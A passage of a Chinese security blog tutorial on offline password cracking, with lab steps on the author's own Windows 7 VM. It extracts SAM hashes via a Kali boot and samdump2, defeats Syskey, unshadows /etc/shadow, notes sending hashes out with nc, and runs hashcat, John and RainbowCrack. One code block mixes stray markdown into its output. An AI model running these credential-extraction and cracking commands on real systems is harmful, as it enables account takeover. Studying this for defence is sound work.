+<li><strong>服务器端用户数据库应加盐加密保存</strong></li>
+<li><strong>破解思路</strong></li>
+<li><strong>嗅探获取密码 HASH</strong></li>
+<li><strong>利用漏洞登陆服务器并从用户数据库获取密码 HASH</strong></li>
+<li><strong>识别HASH 类型，长度、字符集</strong></li>
+<li><strong>利用离线破解工具碰撞密码HASH</strong></li>
+<li><strong>优势</strong></li>
+<li><strong>离线不会触发密码锁定机制</strong></li>
+<li><strong>不会产生大量登陆失败日志引起管理员注意</strong></li>
+</ul>
+<h3 id="hash-识别工具"><strong>1、HASH 识别工具</strong></h3>
+<ul>
+<li><strong>hash‐identifier</strong></li>
+<li><strong>Hashid</strong></li>
+<li><strong>可能识别错误或无法识别</strong></li>
+<li><strong>示例</strong></li>
+</ul>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909115633736-1141097131.png" /></strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909115745124-1986177475.png" /><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909120004170-1750492458.png" /></p>
+<h3 id="windows-hash获取工具"><strong>2、Windows
+HASH获取工具</strong></h3>
+<ul>
+<li><strong>利用漏洞：Pwdump 、 fgdump 、 mimikatz 、 wce</strong></li>
+<li><strong>物理接触：samdump2</strong></li>
+<li><strong>Kali ISO 启动虚拟机</strong></li>
+<li><strong>mount /dev/sda2 /mnt</strong></li>
+<li><strong>cd /mnt /Windows/ config</strong></li>
+<li><strong>samdump2 SYSTEM SAM -o sam.hash</strong></li>
+<li><strong>利用nc 传输 HASH</strong></li>
+</ul>
+<p><strong>获取Windows目标机的用户名和登录密码方法，在可以物理接触目标机的情况下，通过
+Kali
+的ISO引导目标机启动，然后将目标机磁盘挂载到Kali上，再利用samdump2工具提取目标机SAM数据库，对提取到的HASH进行分析破解。</strong></p>
+<p><strong>演示【以VM VirtualBox下安装的Windows7为例】</strong></p>
+<p><strong>注，之所以选择
+VirtualBox是因为要用Kali的ISO引导启动系统，VirtualBox可以设置系统的启动顺序【软驱，光驱，硬盘】，VMware
+Workstation没法设置。</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909175458893-1798938684.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909175707857-1970216949.png" /></p>
+<p><strong>查看磁盘分区</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909180602230-106750733.png" /></p>
+<p><strong>把Win7硬盘挂载到Kali</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909180853093-2097286501.png" /></p>
+<p><strong>samdump2 提取SAM中的HASH</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">samdump2 SYSTEM SAM -o sam.hash </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909181147442-2055388588.png)</span><br><span class="line"></span><br><span class="line">**用户名，密码存于SAM数据库，而SYSTEM保存着一个加密SAM数据库的密钥【默认情况下没有密钥】，也就是说如果SAM数据库被加密的话，我们登录时需要输两次密码【第一次SYSTEM中的密码，第二次用户名及登录密码】才能进入系统。**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909181957182-244014619.png)</span><br><span class="line"></span><br><span class="line">**注，windows提取到的两条HASH分别是LM-Hash【已弃用】和NTLM-Hash，这是对同一个密码的两种不同的加密方式。**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909190326717-1348486228.png)**</span><br><span class="line"></span><br><span class="line"><span class="comment">### 3、Syskey加密SAM数据库及破解</span></span><br><span class="line"></span><br><span class="line">  * **使用Bootkey 利用 RC4 算法加密 SAM 数据库**</span><br><span class="line">  * **Bootkey保存于 SYSTEM 文件中**</span><br><span class="line"></span><br><span class="line"><span class="comment">#### **（1）bkhive 破解**</span></span><br><span class="line"></span><br><span class="line">  * **Kali 2.0  弃用了 bkhive，可以用 Kali 1.x系列实验【[ **http://old.kali.org/kali-images/**](http://old.kali.org/kali-images/)】**</span><br><span class="line">  * **bkhive  SYSTEM  key【 **从SYSTEM 文件中提取bootkey】**</span><br><span class="line">  * **samdump2 SAM key &gt; sam.hash【用bootkey解密SAM，提取未加密前的<span class="built_in">hash</span>，注，samdump2版本已更新，不再支持此功能，也得用老版本的】**</span><br><span class="line"></span><br><span class="line">**示例演示**</span><br><span class="line"></span><br><span class="line">  * **先用Syskey工具对SAM 数据库加密**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911113637882-451568300.png)**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911113750998-1810251944.png)</span><br><span class="line"></span><br><span class="line">  * **加密后的效果**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911115525539-1834495718.gif)</span><br><span class="line"></span><br><span class="line">**由于Kali 2.0已经弃用了bkhive，所以这里直接用BT5实验，另为简便起见，直接用BT5的ISO引导启动win7，在win7中演示破解 ……**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911143000297-762009203.png)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911150815115-2131205080.png)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911150911509-567371409.png)</span><br><span class="line"></span><br><span class="line">  * **BT5没用图形界面，此处没法手动拷贝，用nc传下。然后用前面的方法对获得的<span class="built_in">hash</span>【79 ……<span class="built_in">cd</span>】进行破解即可。**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911150920548-1735901148.png)</span><br><span class="line"></span><br><span class="line">  * **注，基本流程/原理如上。但上图提取到的<span class="built_in">hash</span>【79 ……<span class="built_in">cd</span>】依旧是SAM被加密后的<span class="built_in">hash</span>【本应是syskey加密SAM前NTLM算法加密登录密码的HASH】，没搞明白为啥，有看懂的可以评论说下，感谢！**</span><br><span class="line"></span><br><span class="line"><span class="comment">#### **（2）PSPR 破解**</span></span><br><span class="line"></span><br><span class="line">**Proactive System Password Recovery**  (简称为 PSPR，即以前的 Advanced Windows</span><br><span class="line">Password Recovery) 是一个恢复 Windows 所有密码类型的程序：登录密码 (在用户已登录和拥有管理员权限时)、屏保护密码、.NET</span><br><span class="line">护照密码、RAS 和拨号密码、共享资源密码、SYSKEY 启动密码、存储在缓存的凭证密码、无线 (WEP 和 WPA-PSK)</span><br><span class="line">加密键等。程序同样也能显示所有用户和组 (它们的属性)，允许在其它用户环境中运行任何程序、显示密码历史 hashes、从 SAM 和系统文件读取密码</span><br><span class="line">hashes、读取保护的存储记录、解密 Windows 脚本、揭示隐藏在星号下的密码、启用禁用的控制器、在 PWL 文件上执行暴力和字典攻击</span><br><span class="line">(Windows 9x)。还可以显示产品 ID 和 Widnows CD keys、微软 Office 和其它微软的安装软件。</span><br><span class="line"></span><br><span class="line">**下载：** 链接：&lt;https://pan.baidu.com/s/1oVsFUZIo-</span><br><span class="line">bquAJwNfJSjGA&gt;，提取码：g780，已破解，安装时不需要注册码，建议虚拟机使用【可能有后门】</span><br><span class="line"></span><br><span class="line">**操作和前面相似，拷贝目标机【win7】在C:\Windows\System32\config目录下的SAM、Security 和 Security 文件到安装有PSPR的系统上，暴力破解如下：**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912171218577-867961977.png)**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912171610447-789869725.png)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912172029684-903193067.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">#### （3） **saminside 破解【已知启动密码】**</span></span><br><span class="line"></span><br><span class="line">**下载：** 链接：&lt;https://pan.baidu.com/s/11yy6u7llKdWtFW-2F6eMlw&gt;，提取码：cpxj</span><br><span class="line"></span><br><span class="line">**注，syskey设置的启动密码用saminside是破解不了的，如下图【** The system key doesn<span class="string">&#x27;t match SAM</span></span><br><span class="line"><span class="string">registry file! **】：**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912172740989-1805615435.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**已知启动密码破解登录密码【速度取决于密码复杂程度】如下图**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912173152284-1065104784.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912173235793-1255364147.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912173259930-394979048.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 4、Hashcat</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  * **开源多线程密码破解工具**</span></span><br><span class="line"><span class="string">  * **支持CPU、GPU、APU、DSP和FPGA等多种计算核心**</span></span><br><span class="line"><span class="string">  * **支持多种hash散列算法，支持对rar、office、pdf、windows账户、wifi等多种密码的破解**</span></span><br><span class="line"><span class="string">  * **常用参数**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">-a  指定要使用的破解模式-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span></span><br><span class="line"><span class="string">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span></span><br><span class="line"><span class="string">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span></span><br><span class="line"><span class="string">--show  显示已经破解的hash及该hash所对应的明文</span></span><br><span class="line"><span class="string">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span></span><br><span class="line"><span class="string">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span></span><br><span class="line"><span class="string">--increment-max  密码最大长度,同上</span></span><br><span class="line"><span class="string">--outfile-format 指定破解结果的输出格式id,默认是3</span></span><br><span class="line"><span class="string">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span></span><br><span class="line"><span class="string">--remove     删除已被破解成功的hash</span></span><br><span class="line"><span class="string">-r       使用自定义破解规则</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>模式</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 Straight：字典破解</span><br><span class="line">1 Combination：将字典中密码进行组合 1 2 &gt; 11 22 12 21</span><br><span class="line">3 Brute force：指定字符集【或全部字符集】所有组合</span><br><span class="line">6  Hybrid Wordlist + Mask：混合字典+掩码</span><br><span class="line">7  Hybrid Mask + Wordlist：混合掩码+字典</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>掩码规则</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l | abcdefghijklmnopqrstuvwxyz　　 　　   [a-z]</span><br><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ　　       [A-Z]</span><br><span class="line">d | 0123456789　　                        [0-9]</span><br><span class="line">h | 0123456789abcdef　 　                 [0-9a-f]</span><br><span class="line">H | 0123456789ABCDEF　　                  [0-9A-F]</span><br><span class="line">s | !<span class="string">&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span></span><br><span class="line"><span class="string">a | ?l?u?d?s</span></span><br><span class="line"><span class="string">b | 0x00 - 0xff</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>常用命令</strong></li>
+<li><strong>hashcat -b【测试当前CPU破解各种密码的速度】</strong></li>
+<li><strong>hashcat -m 100 hash.dump pass.lst</strong></li>
+<li><strong>hashcat -m 0 hash.txt a 3 ?l?l?l?l?l?l?l?l?d?d</strong></li>
+<li><strong>结果：hashcat.pot</strong></li>
+<li><strong>hashcat -m 100 a 3 hash i increment min 6 increment max 8 ?
+l?l?l?l?l?l?l?l</strong></li>
+</ul>
+<p><strong>注，</strong> 可能会出现的报错：hashcat Device #1: Not enough
+allocatable device memory for this
+attack，修改kali虚拟机内核为单核，内存4G即可解决。</p>
+<ul>
+<li><strong>示例</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 4400 test.hash password.lst      <span class="comment">#4400 | md5(sha1($pass)) | Raw Hash salted and/or iterated</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911110352195-327720904.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911111633927-1199026413.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911111658602-1978878474.png" /></p>
+<ul>
+<li><strong>掩码示例</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/ temp]</span><br><span class="line">└─<span class="comment"># hashcat -m 4400 -a 3 test.hash -i --increment-min 4 --increment-max 6 ?d?d?d?d?d?d</span></span><br><span class="line">hashcat (v6.2.5) starting  </span><br><span class="line">………………………………</span><br><span class="line">afda1feb31ae9c3bff0ec654cefc20db:654321                                                                     </span><br><span class="line">………………………………</span><br></pre></td></tr></table></figure>
+<h3 id="oclhashcat">5、oclhashcat</h3>
+<ul>
+<li><strong>号称世界上最快、基于</strong> <strong>GPGPU
+的密码破解软件</strong></li>
+<li><strong>免费开源、支持多平台、支持分布式、 170+hash
+算法</strong></li>
+<li><strong>硬件支持</strong></li>
+<li><strong>虚拟机中无法使用</strong></li>
+<li><strong>支持CUDA 技术的 Nvidia 显卡</strong></li>
+<li><strong>支持OpenCL 技术 的 AMD 显卡</strong></li>
+<li><strong>安装相应的驱动</strong></li>
+<li><strong>限制</strong></li>
+<li><strong>最大密码长度 55 字符</strong></li>
+<li><strong>使用Unicode 的最大密码长度 27 字符</strong></li>
+<li><strong>关于版本</strong></li>
+<li><strong>oclHashcat-plus 、 oclHashcat-lite 已经合并为
+oclhashcat</strong></li>
+<li><strong>命令</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">oclHashcat -m 0 hash.txt a 3 ?a?a?a?a?a?a?a</span><br><span class="line">?l = abcdefghijklmnopqrstuvwxyz</span><br><span class="line">?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">?d = 0123456789</span><br><span class="line">?s = !<span class="string">&quot;#$%&amp;&#x27;()*+,-.:;/=&gt;?@[\]^_`~&#123;|&#125;~ </span></span><br><span class="line"><span class="string">?a = ?l?u?d?s</span></span><br><span class="line"><span class="string">?b = 0x00-0xff</span></span><br></pre></td></tr></table></figure>
+<h3 id="rainbowcrack">6、RainbowCrack</h3>
+<ul>
+<li><strong>基于时间记忆权衡技术生成彩虹表</strong></li>
+<li><strong>提前计算密码的 HASH 值，通过比对 HASH
+值破解密码</strong></li>
+<li><strong>计算HASH 的速度很慢，修改版支持 CUDA GPU</strong></li>
+<li><strong>KALI中 包含的 RainbowCrack 工具</strong></li>
+<li><strong>rtgen：预计算，生成彩虹表，耗时的阶段</strong></li>
+<li><strong>rtsort：对 rtgen 生成的彩虹表进行排序</strong></li>
+<li><strong>rcrack：查找彩虹表破解密码</strong></li>
+<li><strong>以上命令必须顺序使用</strong></li>
+<li><strong>彩虹表</strong></li>
+<li><strong>密码明文、HASH 值、 HASH
+算法、字符集、明文长度范围</strong></li>
+<li><strong>rtgen</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usage: </span><br><span class="line">rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index</span><br><span class="line">rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index -bench</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>下载彩虹表</strong></li>
+<li><a target="_blank" rel="noopener" href="https://www.freerainbowtables.com/en/download"
+class="uri">https://www.freerainbowtables.com/en/download</a></li>
+<li><a target="_blank" rel="noopener" href="https://ophcrack.sourceforge.io/tables.php"
+class="uri">https://ophcrack.sourceforge.io/tables.php</a></li>
+<li><a target="_blank" rel="noopener" href="http://project-rainbowcrack.com/table.htm"
+class="uri">http://project-rainbowcrack.com/table.htm</a></li>
+<li><strong>彩虹表排序</strong></li>
+<li><strong>/usr/share/rainbowcrack【rtgen生成的彩虹表位置】</strong></li>
+<li><strong>rtsort path【指定彩虹表位置，不含表名】</strong></li>
+<li><strong>密码破解</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">usage: </span><br><span class="line">./rcrack path [path] [...] -h <span class="built_in">hash</span></span><br><span class="line">./rcrack path [path] [...] -l hash_list_file</span><br><span class="line">./rcrack path [path] [...] -lm pwdump_file</span><br><span class="line">./rcrack path [path] [...] -ntlm pwdump_file</span><br><span class="line">path:              directory <span class="built_in">where</span> rainbow tables (*.rt, *.rtc) are stored</span><br><span class="line">-h <span class="built_in">hash</span>:           load single <span class="built_in">hash</span></span><br><span class="line">-l hash_list_file: load hashes from a file, each <span class="built_in">hash</span> <span class="keyword">in</span> a line</span><br><span class="line">-lm pwdump_file:   load lm hashes from pwdump file</span><br><span class="line">-ntlm pwdump_file: load ntlm hashes from pwdump file</span><br></pre></td></tr></table></figure>
+<p><strong>示例</strong></p>
+<ul>
+<li><strong>生成彩虹表</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220928174857868-525504489.png" /></p>
+<ul>
+<li><strong>排序</strong></li>
+</ul>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220928180228998-1641503803.png" /></strong></p>
+<ul>
+<li><strong>破解</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220928180251342-1069119808.png" /></p>
+<h3 id="john">7、John</h3>
+<ul>
+<li>查看支持破解的加密类型：john --list=formats</li>
+<li><strong>模式</strong></li>
+<li><strong>Wordlist：基于规则的字典破解</strong></li>
+<li><strong>Single crack ：默认被首先执行，使用 Login/GECOS
+信息尝试破解</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929090456044-2104443828.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929090708911-1920887750.png" /></p>
+<ul>
+<li>注，密码不在passwd中，而在/etc/shadow中。</li>
+<li>Incremental：所有或指定字符集的暴力破解</li>
+<li>External：需要在主配配文件中用 C 语言子集编程</li>
+<li><strong>默认破解模式</strong></li>
+<li>Single--&gt;wordlist--&gt;incremental</li>
+<li><strong>主配置文件【/etc/john/john.conf】中指定默认
+wordlist</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929091024613-940611694.png" /></p>
+<h4 id="破解linux-系统账号密码">（1）破解Linux 系统账号密码</h4>
+<ul>
+<li><strong>合并passwd和shadow</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt;test_pass.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929092424631-1739425895.png" /></p>
+<ul>
+<li><strong>破解</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john test_pass.txt    <span class="comment">#直接执行如果提示：No password hashes loaded (see FAQ)，加个--format=crypt，如下</span></span><br><span class="line">john --format=crypt test_pass.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929094122241-1103827089.png" /></p>
+<ul>
+<li><strong>查看已破解密码</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show test_pass.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929094240862-234951999.png" /></p>
+<ul>
+<li><strong>已破解密码的保存文件</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929095308209-641121206.png" /></p>
+<h4 id="破解windows-密码">（2）破解windows 密码</h4>
+<ul>
+<li><strong>用前面的方法提取个windows密码的hash来测试，示例：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929101630274-278013203.png" /></p>
+<ul>
+<li><strong>破解</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john sam.hash --wordlist=/usr/share/john/password.lst  --format=nt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929102208777-658695823.png" /></p>
+<ul>
+<li><strong>查看已破解密码</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john sam.hash --format=nt --show</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929102136558-1059335661.png" /></p>
+<h4 id="johnny">（3）Johnny</h4>
+<ul>
+<li>图形化界面的 john</li>
+<li>示例</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929102809780-1183196183.png" /></p>
+<h3 id="ophcrack图形界面">8、Ophcrack【图形界面】</h3>
+<ul>
+<li>基于彩虹表的LM、NTLM 密码破解软件</li>
+<li>彩虹表下载：<a
+target="_blank" rel="noopener" href="https://ophcrack.sourceforge.io/tables.php">http://ophcrack.sourceforge.net/tables.php</a></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929103224713-2141941836.png" /></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2022/08/17/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" title="密码破解">https://z9m8r8.github.io/2022/08/17/密码破解/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%97%E5%85%B8/" rel="tag"><i class="fa fa-tag"></i> 字典</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/07/%E5%9F%BA%E4%BA%8Esnort%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E6%9E%84%E5%BB%BA/" rel="prev" title="基于Snort的入侵检测系统构建">
+                  <i class="fa fa-angle-left"></i> 基于Snort的入侵检测系统构建
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/09/27/grafana%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%90cve-2021-43798%E3%80%91/" rel="next" title="Grafana目录遍历漏洞复现【CVE-2021-43798】">
+                  Grafana目录遍历漏洞复现【CVE-2021-43798】 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
